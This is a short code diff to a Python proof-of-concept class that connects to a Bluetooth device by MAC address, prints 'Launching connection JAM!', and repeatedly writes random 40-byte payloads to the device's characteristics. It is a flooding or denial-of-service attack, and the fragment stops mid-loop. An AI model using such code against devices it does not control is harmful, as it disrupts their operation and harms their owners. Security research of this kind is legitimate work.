@@ -31,8 +31,11 @@ class POC():
 
                     if client.is_connected:
 
-                        print(f"[+] Successfully connected to: {mac}\n"); await client.pair()
+                        print(f"[+] Successfully connected to: {mac}")
+                        print("[+] Launching connection JAM!\n"); await client.pair()
                         
+
+                        # THIS IS
                         while True:
                             for char in characteristics:
                                 payload = os.urandom(40)
